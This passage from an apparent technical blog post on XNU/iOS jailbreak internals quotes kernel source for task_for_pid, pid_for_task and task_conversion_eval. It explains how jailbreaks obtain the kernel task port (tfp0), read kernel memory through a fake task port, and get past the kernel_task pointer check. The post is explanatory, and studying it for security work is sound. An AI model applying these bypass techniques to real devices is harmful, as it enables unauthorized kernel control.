    <span class="mi">789</span><span class="o">:</span> 		<span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">copyout</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span> <span class="n">task_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_name_t</span><span class="p">));</span>
    <span class="mi">790</span><span class="o">:</span> 		<span class="n">AUDIT_MACH_SYSCALL_EXIT</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">791</span><span class="o">:</span> 		<span class="k">return</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">792</span><span class="o">:</span> 	<span class="p">}</span> 
    <span class="mi">793</span><span class="o">:</span> 
    <span class="mi">794</span><span class="o">:</span> 
    <span class="mi">795</span><span class="o">:</span> 	<span class="n">p</span> <span class="o">=</span> <span class="n">proc_find</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
    <span class="mi">796</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">PROC_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">797</span><span class="o">:</span> 		<span class="n">error</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">798</span><span class="o">:</span> 		<span class="k">goto</span> <span class="n">tfpout</span><span class="p">;</span>
    <span class="mi">799</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">800</span><span class="o">:</span> 
    <span class="mi">801</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_AUDIT</span>
    <span class="mi">802</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
    <span class="mi">803</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">804</span><span class="o">:</span> 
    <span class="mi">805</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">task_for_pid_posix_check</span><span class="p">(</span><span class="n">p</span><span class="p">)))</span> <span class="p">{</span>
    <span class="mi">806</span><span class="o">:</span> 		<span class="n">error</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">807</span><span class="o">:</span> 		<span class="k">goto</span> <span class="n">tfpout</span><span class="p">;</span>
    <span class="mi">808</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">809</span><span class="o">:</span> 
    <span class="mi">810</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">task</span> <span class="o">!=</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">811</span><span class="o">:</span> 		<span class="cm">/* If we aren't root and target's task access port is set... */</span>
    <span class="mi">812</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">kauth_cred_issuser</span><span class="p">(</span><span class="n">kauth_cred_get</span><span class="p">())</span> <span class="o">&amp;&amp;</span>
    <span class="mi">813</span><span class="o">:</span> 			<span class="n">p</span> <span class="o">!=</span> <span class="n">current_proc</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
    <span class="mi">814</span><span class="o">:</span> 			<span class="p">(</span><span class="n">task_get_task_access_port</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tfpport</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
    <span class="mi">815</span><span class="o">:</span> 			<span class="p">(</span><span class="n">tfpport</span> <span class="o">!=</span> <span class="n">IPC_PORT_NULL</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">816</span><span class="o">:</span> 
    <span class="mi">817</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">tfpport</span> <span class="o">==</span> <span class="n">IPC_PORT_DEAD</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">818</span><span class="o">:</span> 				<span class="n">error</span> <span class="o">=</span> <span class="n">KERN_PROTECTION_FAILURE</span><span class="p">;</span>
    <span class="mi">819</span><span class="o">:</span> 				<span class="k">goto</span> <span class="n">tfpout</span><span class="p">;</span></code></pre></figure>

<p>Another thing you will notice here is the check for <strong>pid=0</strong>. This is done to prevent user specified process from accessing the send right to the kernel task port (tfp0) by specifying the pid 0. Previously, once kernel r/w was obtained, the jailbreaks used to kill this check and call <strong>task_for_pid(0)</strong>. However, with the advent of <strong>KPP</strong> and <strong>AMCC/KTRR</strong>, patching wasn’t possible anymore, and hence other techniques were used but the name <strong>tfp0</strong> still stuck and is still used to signify read and write access to kernel memory.</p>

<p>The other API very commonly used is the <strong>pid_for_task()</strong> Mach Trap, which is used to find the pid for the process corresponding to a given Mach Task. What it basically does is looks up the <strong>task</strong> struct, looks up the <strong>bsd_info</strong> field which points to the corresponding BSD <strong>proc</strong> struct in the kernel, and reads the <strong>p_pid</strong> value from the <strong>proc</strong> struct. This technique has been widely used to read arbitrary kernel memory four bytes at a time (since the <strong>pid</strong> field is 32 bits) by creating a fake task port, which is discussed later in this article.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_unix</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">612</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">613</span><span class="o">:</span> <span class="n">pid_for_task</span><span class="p">(</span>
    <span class="mi">614</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">pid_for_task_args</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
    <span class="mi">615</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">616</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>	<span class="n">t</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">t</span><span class="p">;</span>
    <span class="mi">617</span><span class="o">:</span> 	<span class="n">user_addr_t</span>		<span class="n">pid_addr</span>  <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span>  
    <span class="mi">618</span><span class="o">:</span> 	<span class="n">proc_t</span> <span class="n">p</span><span class="p">;</span>
    <span class="mi">619</span><span class="o">:</span> 	<span class="n">task_t</span>		<span class="n">t1</span><span class="p">;</span>
    <span class="mi">620</span><span class="o">:</span> 	<span class="kt">int</span>	<span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="mi">621</span><span class="o">:</span> 	<span class="n">kern_return_t</span>	<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">622</span><span class="o">:</span> 
    <span class="mi">623</span><span class="o">:</span> 	<span class="n">AUDIT_MACH_SYSCALL_ENTER</span><span class="p">(</span><span class="n">AUE_PIDFORTASK</span><span class="p">);</span>
    <span class="mi">624</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">mach_port1</span><span class="p">,</span> <span class="n">t</span><span class="p">);</span>
    <span class="mi">625</span><span class="o">:</span> 
    <span class="mi">626</span><span class="o">:</span> 	<span class="n">t1</span> <span class="o">=</span> <span class="n">port_name_to_task_inspect</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="mi">627</span><span class="o">:</span> 
    <span class="mi">628</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">t1</span> <span class="o">==</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">629</span><span class="o">:</span> 		<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">630</span><span class="o">:</span> 		<span class="k">goto</span> <span class="n">pftout</span><span class="p">;</span>
    <span class="mi">631</span><span class="o">:</span> 	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="mi">632</span><span class="o">:</span> 		<span class="n">p</span> <span class="o">=</span> <span class="n">get_bsdtask_info</span><span class="p">(</span><span class="n">t1</span><span class="p">);</span>
    <span class="mi">633</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">634</span><span class="o">:</span> 			<span class="n">pid</span>  <span class="o">=</span> <span class="n">proc_pid</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="mi">635</span><span class="o">:</span> 			<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">636</span><span class="o">:</span> 		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">is_corpsetask</span><span class="p">(</span><span class="n">t1</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">637</span><span class="o">:</span> 			<span class="n">pid</span> <span class="o">=</span> <span class="n">task_pid</span><span class="p">(</span><span class="n">t1</span><span class="p">);</span>
    <span class="mi">638</span><span class="o">:</span> 			<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">639</span><span class="o">:</span> 		<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
    <span class="mi">640</span><span class="o">:</span> 			<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">641</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">642</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">643</span><span class="o">:</span> 	<span class="n">task_deallocate</span><span class="p">(</span><span class="n">t1</span><span class="p">);</span>
    <span class="mi">644</span><span class="o">:</span> <span class="n">pftout</span><span class="o">:</span>
    <span class="mi">645</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="mi">646</span><span class="o">:</span> 	<span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">copyout</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="n">pid_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
    <span class="mi">647</span><span class="o">:</span> 	<span class="n">AUDIT_MACH_SYSCALL_EXIT</span><span class="p">(</span><span class="n">err</span><span class="p">);</span>
    <span class="mi">648</span><span class="o">:</span> 	<span class="k">return</span><span class="p">(</span><span class="n">err</span><span class="p">);</span>
    <span class="mi">649</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">650</span><span class="o">:</span> </code></pre></figure>

<h2 id="kernel-task-port">Kernel Task Port</h2>

<p>The kernel is assigned the PID 0, and the corresponding process-less task is dubbed as the kernel task. Having a send right to the Kernel task gives you complete control of the kernel memory, it is possible to read and write into kernel memory and also inject arbitrary code by allocating memory. This is what exploits try to obtain.</p>

<p>As discussed before, one of the earlier ways to use <strong>task_for_pid(0)</strong> was by Patching out the check for pid 0. There was also the <strong>processer_set_tasks()</strong> API on Mac OS that on a not secure kernel (<strong>#if defined SECURE_KERNEL</strong>), i.e. Mac OS, returned the kernel task port as the first argument.</p>

<p>Once the kernel task port is obtained, the following five MACH APIs are frequently used to interact with the memory. It is important to note that to execute this function successfully, the caller must have a send right to the task port of the target task. If you look at the function prototype, the first argument is the target task (<strong>vm_map_t target_task</strong>). You can pass the kernel task port (<strong>mach_port_t tfp0</strong>) as the first argument, and the API will gladly accept it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*Allocate a region of virtual memory in the target task starting from user specified address*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_allocate</span><span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="o">*</span><span class="n">address</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span> <span class="n">size</span><span class="p">,</span>
    	<span class="kt">int</span> <span class="n">flags</span>
    <span class="p">);</span>

    <span class="cm">/*Deallocate a region of virtual memory in the target task starting from user specified address*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_deallocate</span>
    <span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">address</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span> <span class="n">size</span>
    <span class="p">);</span>

    <span class="cm">/*Read Kernel Memory in the target task at a specified address and transfers it to dynamically allocated memory in the callers address space*/</span>

    <span class="n">kern_return_t</span>
    <span class="nf">mach_vm_read</span><span class="p">(</span>
    	<span class="n">vm_map_t</span>		<span class="n">map</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span>	<span class="n">addr</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span>	<span class="n">size</span><span class="p">,</span>
    	<span class="n">pointer_t</span>		<span class="o">*</span><span class="n">data</span><span class="p">,</span>
    	<span class="n">mach_msg_type_number_t</span>	<span class="o">*</span><span class="n">data_size</span><span class="p">)</span> <span class="o">*</span><span class="n">data_size</span><span class="p">);</span>

    <span class="cm">/*Copy data from a caller-specified address to the given memory region in the target tasks address space*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_write</span>
    <span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target_task</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">address</span><span class="p">,</span>
    	<span class="n">vm_offset_t</span> <span class="n">data</span><span class="p">,</span>
    	<span class="n">mach_msg_type_number_t</span> <span class="n">dataCnt</span>
    <span class="p">);</span>

    <span class="cm">/*Sets the Protection attribute for a given memory range in the target tasks address space*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_protect</span><span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target_task</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">address</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span> <span class="n">size</span><span class="p">,</span> 
    	<span class="n">boolean_t</span> <span class="n">set_maximum</span><span class="p">,</span>
    	<span class="n">svm_prot_t</span> <span class="n">new_protection</span><span class="p">);</span></code></pre></figure>

<h2 id="hsp4-patch">hsp4 Patch</h2>

<p>One of the other techniques Apple implemented for preventing jailbreakers from getting the kernel task was a pointer check for the <strong>kernel_task</strong>. In this case, while the handle to the kernel task was obtained, the Mach VM calls would not work. The check starts from the <strong>ipc_kmsg_trace_send</strong> function. This calls the function <strong>convert_port_to_task_with_exec_token</strong>(Line 356) in <strong>osfmk/kern/ipc_kobject.c</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_kobject</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">343</span><span class="o">:</span> 	<span class="cm">/*
    344: 	 * Find the routine to call, and call it
    345: 	 * to perform the kernel function
    346: 	 */</span>
    <span class="mi">347</span><span class="o">:</span> 	<span class="n">ipc_kmsg_trace_send</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">option</span><span class="p">);</span>
    <span class="mi">348</span><span class="o">:</span> 	<span class="p">{</span>
    <span class="mi">349</span><span class="o">:</span> 	    <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">350</span><span class="o">:</span> 		<span class="cm">/*
    351: 		 * Check if the port is a task port, if its a task port then
    352: 		 * snapshot the task exec token before the mig routine call.
    353: 		 */</span>
    <span class="mi">354</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_remote_port</span><span class="p">;</span>
    <span class="mi">355</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_TASK</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">356</span><span class="o">:</span> 			<span class="n">task</span> <span class="o">=</span> <span class="n">convert_port_to_task_with_exec_token</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exec_token</span><span class="p">);</span>
    <span class="mi">357</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">358</span><span class="o">:</span> 
    <span class="mi">359</span><span class="o">:</span> 		<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">routine</span><span class="p">)(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">,</span> <span class="n">reply</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">);</span>
    <span class="mi">360</span><span class="o">:</span> 
    <span class="mi">361</span><span class="o">:</span> 		<span class="cm">/* Check if the exec token changed during the mig routine */</span>
    <span class="mi">362</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">task</span> <span class="o">!=</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">363</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">exec_token</span> <span class="o">!=</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">exec_token</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">364</span><span class="o">:</span> 				<span class="n">exec_token_changed</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
    <span class="mi">365</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">366</span><span class="o">:</span> 			<span class="n">task_deallocate</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">367</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">368</span><span class="o">:</span> 
    <span class="mi">369</span><span class="o">:</span> 		<span class="n">kernel_task</span><span class="o">-&gt;</span><span class="n">messages_received</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">370</span><span class="o">:</span> 	    <span class="p">}</span>
    <span class="mi">371</span><span class="o">:</span> 	    <span class="k">else</span> <span class="p">{</span>
    <span class="mi">372</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ipc_kobject_notify</span><span class="p">(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">,</span> <span class="n">reply</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">)){</span>
    <span class="mi">373</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">DEVELOPMENT</span> <span class="o">||</span> <span class="n">DEBUG</span>
    <span class="mi">374</span><span class="o">:</span> 		    <span class="n">printf</span><span class="p">(</span><span class="s">"ipc_kobject_server: bogus kernel message, id=%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
    <span class="mi">375</span><span class="o">:</span> 			<span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_id</span><span class="p">);</span>
    <span class="mi">376</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* DEVELOPMENT || DEBUG */</span>
    <span class="mi">377</span><span class="o">:</span> 		    <span class="n">_MIG_MSGID_INVALID</span><span class="p">(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_id</span><span class="p">);</span>
    <span class="mi">378</span><span class="o">:</span> 
    <span class="mi">379</span><span class="o">:</span> 		    <span class="p">((</span><span class="n">mig_reply_error_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">reply</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">RetCode</span>
    <span class="mi">380</span><span class="o">:</span> 			<span class="o">=</span> <span class="n">MIG_BAD_ID</span><span class="p">;</span>
    <span class="mi">381</span><span class="o">:</span> 		<span class="p">}</span></code></pre></figure>

<p>The function <strong>convert_port_to_task_with_exec_token</strong> then calls <strong>task_conversion_eval</strong>(Line 1543).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_tt</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1517</span><span class="o">:</span> <span class="cm">/*
    1518:  *	Routine:	convert_port_to_task_with_exec_token
    1519:  *	Purpose:
    1520:  *		Convert from a port to a task and return
    1521:  *		the exec token stored in the task.
    1522:  *		Doesn't consume the port ref; produces a task ref,
    1523:  *		which may be null.
    1524:  *	Conditions:
    1525:  *		Nothing locked.
    1526:  */</span>
    <span class="mi">1527</span><span class="o">:</span> <span class="n">task_t</span>
    <span class="mi">1528</span><span class="o">:</span> <span class="n">convert_port_to_task_with_exec_token</span><span class="p">(</span>
    <span class="mi">1529</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>		<span class="n">port</span><span class="p">,</span>
    <span class="mi">1530</span><span class="o">:</span> 	<span class="kt">uint32_t</span>		<span class="o">*</span><span class="n">exec_token</span><span class="p">)</span>
    <span class="mi">1531</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1532</span><span class="o">:</span> 	<span class="n">task_t</span>		<span class="n">task</span> <span class="o">=</span> <span class="n">TASK_NULL</span><span class="p">;</span>
    <span class="mi">1533</span><span class="o">:</span> 
    <span class="mi">1534</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">1535</span><span class="o">:</span> 		<span class="n">ip_lock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1536</span><span class="o">:</span> 
    <span class="mi">1537</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span>	<span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>					<span class="o">&amp;&amp;</span>
    <span class="mi">1538</span><span class="o">:</span> 				<span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_TASK</span>		<span class="p">)</span> <span class="p">{</span>
    <span class="mi">1539</span><span class="o">:</span> 			<span class="n">task_t</span> <span class="n">ct</span> <span class="o">=</span> <span class="n">current_task</span><span class="p">();</span>
    <span class="mi">1540</span><span class="o">:</span> 			<span class="n">task</span> <span class="o">=</span> <span class="p">(</span><span class="n">task_t</span><span class="p">)</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span><span class="p">;</span>
    <span class="mi">1541</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">task</span> <span class="o">!=</span> <span class="n">TASK_NULL</span><span class="p">);</span>
    <span class="mi">1542</span><span class="o">:</span> 
    <span class="mi">1543</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">task_conversion_eval</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span> <span class="n">task</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">1544</span><span class="o">:</span> 				<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1545</span><span class="o">:</span> 				<span class="k">return</span> <span class="n">TASK_NULL</span><span class="p">;</span>
    <span class="mi">1546</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">1547</span><span class="o">:</span> 
    <span class="mi">1548</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">exec_token</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1549</span><span class="o">:</span> 				<span class="o">*</span><span class="n">exec_token</span> <span class="o">=</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">exec_token</span><span class="p">;</span>
    <span class="mi">1550</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">1551</span><span class="o">:</span> 			<span class="n">task_reference_internal</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">1552</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">1553</span><span class="o">:</span> 
    <span class="mi">1554</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1555</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1556</span><span class="o">:</span> 
    <span class="mi">1557</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">1558</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1559</span><span class="o">:</span> </code></pre></figure>

<p>This is where the check happens. The victim is the task on which operation is being performed and the caller is the one calling the function. The first check assumes if the caller is the kernel, and returns success if so. The second check is whether the caller is the same as the victim, which should be fine as a task should be able to perform operations on itself. The third check is where it makes a difference, if you make a change to the <strong>kernel_task</strong> and you are not <strong>kernel_task</strong> yourself, then the check will fail. However, this is just a pointer check with the <strong>kernel_task</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_tt</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1369</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">1370</span><span class="o">:</span> <span class="n">task_conversion_eval</span><span class="p">(</span><span class="n">task_t</span> <span class="n">caller</span><span class="p">,</span> <span class="n">task_t</span> <span class="n">victim</span><span class="p">)</span>
    <span class="mi">1371</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1372</span><span class="o">:</span> 	<span class="cm">/*
    1373: 	 * Tasks are allowed to resolve their own task ports, and the kernel is
    1374: 	 * allowed to resolve anyone's task port.
    1375: 	 */</span>
    <span class="mi">1376</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">caller</span> <span class="o">==</span> <span class="n">kernel_task</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1377</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1378</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1379</span><span class="o">:</span> 
    <span class="mi">1380</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">caller</span> <span class="o">==</span> <span class="n">victim</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1381</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1382</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1383</span><span class="o">:</span> 
    <span class="mi">1384</span><span class="o">:</span> 	<span class="cm">/*
    1385: 	 * Only the kernel can can resolve the kernel's task port. We've established
    1386: 	 * by this point that the caller is not kernel_task.
    1387: 	 */</span>
    <span class="mi">1388</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">==</span> <span class="n">TASK_NULL</span> <span class="o">||</span> <span class="n">victim</span> <span class="o">==</span> <span class="n">kernel_task</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1389</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_SECURITY</span><span class="p">;</span>
    <span class="mi">1390</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1391</span><span class="o">:</span> 
    <span class="mi">1392</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">1393</span><span class="o">:</span> 	<span class="cm">/*
    1394: 	 * On embedded platforms, only a platform binary can resolve the task port
    1395: 	 * of another platform binary.
    1396: 	 */</span>
    <span class="mi">1397</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">((</span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">t_flags</span> <span class="o">&amp;</span> <span class="n">TF_PLATFORM</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">caller</span><span class="o">-&gt;</span><span class="n">t_flags</span> <span class="o">&amp;</span> <span class="n">TF_PLATFORM</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">1398</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">SECURE_KERNEL</span>
    <span class="mi">1399</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_SECURITY</span><span class="p">;</span>
    <span class="mi">1400</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">1401</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">cs_relax_platform_task_ports</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1402</span><span class="o">:</span> 			<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1403</span><span class="o">:</span> 		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="mi">1404</span><span class="o">:</span> 			<span class="k">return</span> <span class="n">KERN_INVALID_SECURITY</span><span class="p">;</span>
